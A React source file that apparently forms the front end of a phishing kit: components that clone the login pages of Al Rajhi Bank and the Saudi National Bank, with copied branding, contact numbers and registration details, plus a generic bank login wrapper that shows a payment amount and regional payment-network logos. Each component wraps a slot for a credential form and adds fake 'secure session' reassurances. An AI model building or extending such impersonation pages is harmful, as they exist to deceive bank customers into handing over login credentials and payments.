import React from 'react';
import { Lock, Shield, User, KeyRound, Smartphone, HelpCircle, ChevronRight, Menu, Bell, ChevronDown, Globe, Search, ArrowRight, Info } from 'lucide-react';
import { Bank } from '@/lib/banks';

interface BankCloneProps {
  children: React.ReactNode;
  bank: Bank;
  amount?: string;
}

export const AlRajhiOfficialClone: React.FC<BankCloneProps> = ({ children, bank, amount }) => {
  return (
    <div className="min-h-screen bg-[#F0F2F5] font-sans overflow-x-hidden" dir="rtl">
      {/* Al Rajhi Top Navigation Bar */}
      <div className="bg-[#003D7A] h-10 flex items-center justify-between px-4 md:px-20 text-[10px] text-white/70 font-bold border-b border-white/10">
        <div className="flex items-center gap-6">
          <span className="hover:text-white cursor-pointer transition-colors">عن المصرف</span>
          <span className="hover:text-white cursor-pointer transition-colors">علاقات المستثمرين</span>
          <span className="hover:text-white cursor-pointer transition-colors">الاستدامة</span>
        </div>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-1 cursor-pointer">
            <Globe className="w-3 h-3" />
            <span>English</span>
          </div>
        </div>
      </div>

      {/* Al Rajhi Official Header */}
      <header className="bg-white h-[88px] flex items-center justify-between px-4 md:px-20 shadow-sm sticky top-0 z-50">
        <div className="flex items-center gap-10">
          <img src={bank.logo} alt="Al Rajhi" className="h-12" />
          <nav className="hidden lg:flex items-center gap-8 text-[#003D7A] text-sm font-black">
            <span className="border-b-4 border-[#003D7A] py-8">الأفراد</span>
            <span className="py-8 opacity-40">الأعمال</span>
            <span className="py-8 opacity-40">الشركات</span>
          </nav>
        </div>
        <div className="flex items-center gap-4">
           <Search className="w-6 h-6 text-[#003D7A] hidden md:block" />
           <div className="bg-[#003D7A] text-white px-8 py-3 rounded-full text-sm font-black flex items-center gap-2 hover:bg-[#002D5A] transition-colors cursor-pointer shadow-lg shadow-blue-900/20">
             <User className="w-4 h-4" />
             <span>دخول المباشر</span>
           </div>
           <Menu className="w-8 h-8 text-[#003D7A] lg:hidden" />
        </div>
      </header>

      <main className="container mx-auto px-4 py-16 max-w-6xl">
        <div className="grid lg:grid-cols-12 gap-12 items-start">
          <div className="lg:col-span-6">
            <div className="bg-white rounded-[40px] shadow-[0_30px_60px_-15px_rgba(0,0,0,0.1)] overflow-hidden border border-gray-100 relative">
              <div className="absolute top-0 right-0 w-full h-2 bg-gradient-to-r from-[#003D7A] via-[#0055A5] to-[#F29100]" />
              <div className="p-12">
                <div className="mb-10">
                  <h1 className="text-4xl font-black text-[#003D7A] mb-4">تسجيل الدخول</h1>
                  <p className="text-gray-400 font-bold">أهلاً بك في مباشر الراجحي، بوابتك الآمنة</p>
                </div>
                {children}
                
                <div className="mt-12 pt-8 border-t flex items-center justify-between text-xs text-[#003D7A] font-black">
                   <span className="hover:underline cursor-pointer">نسيت كلمة المرور؟</span>
                   <span className="hover:underline cursor-pointer">مستخدم جديد؟ سجل الآن</span>
                </div>
              </div>
            </div>
          </div>

          <div className="lg:col-span-6 space-y-8">
            <div className="bg-gradient-to-br from-[#003D7A] to-[#002D5A] rounded-[40px] p-12 text-white shadow-2xl relative overflow-hidden group">
              <div className="absolute -bottom-20 -left-20 w-64 h-64 bg-white/5 rounded-full blur-3xl" />
              <div className="relative z-10">
                <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center mb-8">
                  <Shield className="w-8 h-8 text-[#F29100]" />
                </div>
                <h2 className="text-3xl font-black mb-6">نصيحة أمنية</h2>
                <p className="text-lg opacity-80 leading-relaxed mb-8">
                  المصرف لن يطلب منك أبداً الإفصاح عن بياناتك الشخصية أو الأرقام السرية. تأكد دائماً من الرابط في متصفحك.
                </p>
                <div className="flex items-center gap-3 text-[#F29100] font-black">
                  <span>تعرف على المزيد عن حمايتك</span>
                  <ArrowRight className="w-5 h-5" />
                </div>
              </div>
            </div>
            
            <div className="bg-white rounded-[40px] p-10 border border-gray-100 flex items-center justify-between shadow-xl">
               <div className="flex items-center gap-6">
                 <div className="w-14 h-14 bg-gray-50 rounded-2xl flex items-center justify-center">
                   <Smartphone className="w-7 h-7 text-[#003D7A]" />
                 </div>
                 <div>
                   <h3 className="font-black text-[#003D7A]">تطبيق الراجحي</h3>
                   <p className="text-xs text-gray-400 font-bold">أنجز مهامك المصرفية أينما كنت</p>
                 </div>
               </div>
               <ChevronLeft className="w-6 h-6 text-[#003D7A]" />
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-[#003D7A] py-20 px-4 md:px-20 text-white mt-20">
        <div className="container mx-auto grid md:grid-cols-4 gap-12">
          <div className="col-span-1">
            <img src={bank.logo} className="h-10 brightness-0 invert mb-8" />
            <p className="text-sm opacity-60 leading-relaxed">مصرف الراجحي هو شركة مساهمة سعودية، برأس مال 40,000,000,000 ريال سعودي، سجل تجاري رقم 1010000029</p>
          </div>
          <div className="col-span-1 space-y-4">
             <h4 className="font-black text-lg">الروابط السريعة</h4>
             <ul className="text-sm opacity-60 space-y-2">
               <li>التمويل</li>
               <li>البطاقات</li>
               <li>الحسابات</li>
             </ul>
          </div>
          <div className="col-span-2 space-y-8">
             <div className="bg-white/5 p-8 rounded-3xl flex items-center justify-between">
               <div>
                 <h4 className="font-black mb-2">تواصل معنا</h4>
                 <p className="text-3xl font-black text-[#F29100]">920003344</p>
               </div>
               <HelpCircle className="w-12 h-12 opacity-20" />
             </div>
          </div>
        </div>
        <div className="mt-20 pt-10 border-t border-white/10 flex flex-col md:flex-row justify-between items-center gap-6 text-[10px] font-black opacity-40 uppercase tracking-widest">
           <div className="flex gap-10">
             <span>سياسة الخصوصية</span>
             <span>الأحكام والشروط</span>
             <span>خريطة الموقع</span>
           </div>
           <p>© 2025 مصرف الراجحي. جميع الحقوق محفوظة.</p>
        </div>
      </footer>
    </div>
  );
};

export const SNBOfficialClone: React.FC<BankCloneProps> = ({ children, bank }) => {
  return (
    <div className="min-h-screen bg-[#F4F7F6] font-sans" dir="rtl">
      {/* SNB Top Ribbon */}
      <div className="h-12 bg-[#006A4D] flex items-center justify-between px-10 text-[11px] text-white font-bold">
        <div className="flex items-center gap-6">
          <span>الخدمات المصرفية للأفراد</span>
          <span className="opacity-50">الخدمات المصرفية للأعمال</span>
        </div>
        <div className="flex items-center gap-4">
           <span>English</span>
        </div>
      </div>

      <header className="bg-white h-[90px] flex items-center justify-between px-10 shadow-lg sticky top-0 z-50">
        <div className="flex items-center gap-12">
          <img src={bank.logo} alt="SNB" className="h-14" />
          <nav className="hidden lg:flex items-center gap-10 text-[#212529] font-black text-sm uppercase">
            <span>التمويل</span>
            <span>البطاقات</span>
            <span>الاستثمار</span>
            <span>المزيد</span>
          </nav>
        </div>
        <div className="flex items-center gap-6">
          <div className="flex flex-col items-end hidden md:flex">
             <span className="text-[10px] text-gray-400 font-black">الرقم المجاني</span>
             <span className="text-sm font-black text-[#006A4D]">800 244 3300</span>
          </div>
          <div className="bg-[#006A4D] text-white px-8 py-3 rounded-md text-sm font-black hover:bg-[#005a40] transition-all cursor-pointer">
            الأهلي أون لاين
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-20 flex flex-col items-center">
        <div className="w-full max-w-xl bg-white shadow-[0_40px_100px_-20px_rgba(0,0,0,0.15)] rounded-none relative">
          <div className="h-2 bg-[#006A4D] w-full" />
          <div className="p-16">
            <div className="flex flex-col items-center mb-16">
              <div className="w-24 h-24 bg-[#006A4D]/5 rounded-full flex items-center justify-center mb-8 relative">
                <div className="absolute inset-0 border-2 border-[#006A4D]/10 rounded-full animate-ping" />
                <Lock className="w-10 h-10 text-[#006A4D]" />
              </div>
              <h1 className="text-3xl font-black text-[#212529] tracking-tight">الأهلي أون لاين</h1>
              <p className="text-gray-400 font-bold mt-3 text-sm">بوابة الخدمات المصرفية عبر الإنترنت</p>
            </div>
            
            {children}
            
            <div className="mt-12 flex items-center justify-center gap-10 text-xs font-black text-[#006A4D]">
               <span className="hover:underline cursor-pointer">تسجيل جديد</span>
               <span className="hover:underline cursor-pointer">المساعدة</span>
            </div>
          </div>
          
          <div className="bg-[#212529] p-8 flex items-center justify-between text-white overflow-hidden">
            <div className="flex items-center gap-4">
              <Shield className="w-6 h-6 text-[#006A4D]" />
              <span className="text-[10px] font-black tracking-widest">SECURE SESSION ENCRYPTED</span>
            </div>
            <div className="text-[10px] opacity-40 font-bold">SNB_AUTH_V4</div>
          </div>
        </div>
        
        <div className="mt-12 text-center max-w-lg">
           <p className="text-[11px] text-gray-400 font-bold leading-relaxed">
             تأكد من أنك تستخدم الأهلي أون لاين الرسمي. البنك الأهلي السعودي لن يطلب منك أبداً معلوماتك السرية من خلال روابط البريد الإلكتروني أو الرسائل النصية القصيرة.
           </p>
        </div>
      </main>

      <footer className="py-20 text-center">
         <img src={bank.logo} className="h-8 mx-auto opacity-10 grayscale mb-10" />
         <div className="flex justify-center gap-8 text-[10px] font-black text-gray-300 uppercase mb-4">
           <span>الخصوصية</span>
           <span>الأمان</span>
           <span>اتصل بنا</span>
         </div>
         <p className="text-[9px] text-gray-300">© 2025 البنك الأهلي السعودي. جميع الحقوق محفوظة.</p>
      </footer>
    </div>
  );
};

export const GenericBankClone: React.FC<BankCloneProps> = ({ children, bank, amount }) => {
  return (
    <div className="min-h-screen bg-[#F8F9FA] font-sans" dir="rtl">
      <header className="bg-white border-b px-8 py-5 flex items-center justify-between sticky top-0 z-50 shadow-sm">
        <div className="flex items-center gap-5">
          <img src={bank.logo} alt={bank.nameAr} className="h-12" />
          <div className="h-8 w-px bg-gray-100 mx-2" />
          <h2 className="text-xl font-black" style={{ color: bank.color }}>{bank.nameAr}</h2>
        </div>
        <div className="flex items-center gap-3">
           <div className="hidden md:flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full border border-green-100">
             <Shield className="w-4 h-4" />
             <span className="text-[10px] font-black">اتصال آمن وموثوق</span>
           </div>
           <Menu className="w-6 h-6 text-gray-400" />
        </div>
      </header>

      <main className="container mx-auto px-4 py-16 flex flex-col items-center">
        <div className="w-full max-w-lg bg-white rounded-3xl shadow-[0_50px_100px_-20px_rgba(0,0,0,0.12)] overflow-hidden border border-gray-100">
          <div className="p-10 border-b bg-gray-50/50 flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 rounded-2xl flex items-center justify-center text-white shadow-lg" style={{ backgroundColor: bank.color }}>
                <Lock className="w-6 h-6" />
              </div>
              <div>
                <h1 className="text-2xl font-black tracking-tight" style={{ color: bank.color }}>الدخول للمباشر</h1>
                <p className="text-[10px] text-gray-400 font-bold uppercase mt-1">بوابة الدفع الإلكتروني الموحدة</p>
              </div>
            </div>
            {amount && (
              <div className="text-left">
                 <p className="text-[9px] text-gray-400 font-black uppercase">إجمالي المبلغ</p>
                 <p className="text-xl font-black" style={{ color: bank.color }}>{amount}</p>
              </div>
            )}
          </div>
          <div className="p-12">
            {children}
            
            <div className="mt-12 flex items-center justify-between text-[11px] font-black text-gray-400">
               <span className="flex items-center gap-1 hover:text-gray-600 cursor-pointer">
                 <Info className="w-3.5 h-3.5" />
                 المساعدة
               </span>
               <span className="hover:text-gray-600 cursor-pointer">نسيت كلمة المرور؟</span>
            </div>
          </div>
        </div>
        
        <div className="mt-12 flex items-center gap-6 opacity-30">
           <img src="/assets/branding/gov-sadad-logo.jpg" className="h-4 grayscale" />
           <img src="/assets/branding/gov-benefit-logo.png" className="h-4 grayscale" />
           <img src="/assets/branding/gov-knet-logo.png" className="h-4 grayscale" />
        </div>
      </main>
    </div>
  );
};
